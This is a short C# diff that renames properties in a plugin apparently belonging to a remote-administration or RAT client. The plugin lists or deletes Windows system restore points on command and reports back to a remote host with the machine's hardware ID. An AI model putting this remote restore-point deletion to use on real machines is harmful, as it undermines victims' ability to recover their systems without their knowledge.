@@ -14,16 +14,16 @@ namespace Plugin
     {
         public static void Main(LoadingAPI loadingAPI)
         {
-            switch (loadingAPI.currentPacket.packetType)
+            switch (loadingAPI.CurrentPacket.PacketType)
             {
                 case PacketType.UAC_GET_RESTORE_POINT:
-                    RestorePointPacket restorePointPacket = new RestorePointPacket(GetRestorePoints.GetAllRestorePoints(), loadingAPI.baseIp, loadingAPI.HWID);
-                    ClientSender(loadingAPI.host, loadingAPI.key, restorePointPacket);
+                    RestorePointPacket restorePointPacket = new RestorePointPacket(GetRestorePoints.GetAllRestorePoints(), loadingAPI.BaseIp, loadingAPI.HWID);
+                    ClientSender(loadingAPI.Host, loadingAPI.Key, restorePointPacket);
                     break;
 
                 case PacketType.UAC_DELETE_RESTORE_POINT:
-                    DeleteRestorePointPacket deleteRestorePoint = new DeleteRestorePointPacket(((DeleteRestorePointPacket)loadingAPI.currentPacket).index, DeleteRestorePoint.DeleteARestorePoint(((DeleteRestorePointPacket)loadingAPI.currentPacket).index), loadingAPI.baseIp, loadingAPI.HWID);
-                    ClientSender(loadingAPI.host, loadingAPI.key, deleteRestorePoint);
+                    DeleteRestorePointPacket deleteRestorePoint = new DeleteRestorePointPacket(((DeleteRestorePointPacket)loadingAPI.CurrentPacket).index, DeleteRestorePoint.DeleteARestorePoint(((DeleteRestorePointPacket)loadingAPI.CurrentPacket).index), loadingAPI.BaseIp, loadingAPI.HWID);
+                    ClientSender(loadingAPI.Host, loadingAPI.Key, deleteRestorePoint);
                     break;
 
                 default:
